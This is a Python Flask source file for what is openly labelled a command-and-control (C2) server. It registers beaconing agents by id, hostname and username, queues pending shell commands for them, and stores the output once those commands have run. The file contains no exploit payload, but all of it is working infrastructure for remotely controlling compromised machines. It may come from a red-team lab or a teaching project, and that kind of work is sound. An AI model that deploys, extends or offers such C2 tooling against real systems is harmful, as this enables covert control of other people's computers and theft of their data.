from flask import Flask, request, jsonify, abort
from server.database import db_session, init_db
from server.models import Agent, Command
import datetime
import os

app = Flask(__name__)

@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()

@app.route('/')
def index():
    return "C2 Server Online", 200

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
    if not data or 'id' not in data:
        abort(400)
    
    agent_id = data['id']
    hostname = data.get('hostname', 'unknown')
    username = data.get('username', 'unknown')
    
    agent = Agent.query.filter_by(id=agent_id).first()
    if not agent:
        agent = Agent(id=agent_id, hostname=hostname, username=username)
        db_session.add(agent)
    else:
        agent.last_seen = datetime.datetime.utcnow()
        agent.hostname = hostname
        agent.username = username
    
    db_session.commit()
    
    
    commands = Command.query.filter_by(agent_id=agent_id, status='pending').all()
    cmd_list = []
    for cmd in commands:
        cmd_list.append({'id': cmd.id, 'command': cmd.command})
        
    
    return jsonify({'commands': cmd_list})

@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    if not data or 'id' not in data or 'cmd_id' not in data:
        abort(400)
        
    cmd_id = data['cmd_id']
    output = data.get('output', '')
    
    command = Command.query.filter_by(id=cmd_id).first()
    if command:
        command.output = output
        command.status = 'executed'
        command.executed_at = datetime.datetime.utcnow()
        db_session.commit()
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error', 'message': 'Command not found'}), 404

def run_server(port=5000):
    init_db()
    app.run(host='127.0.0.1', port=port)

if __name__ == '__main__':
    run_server()
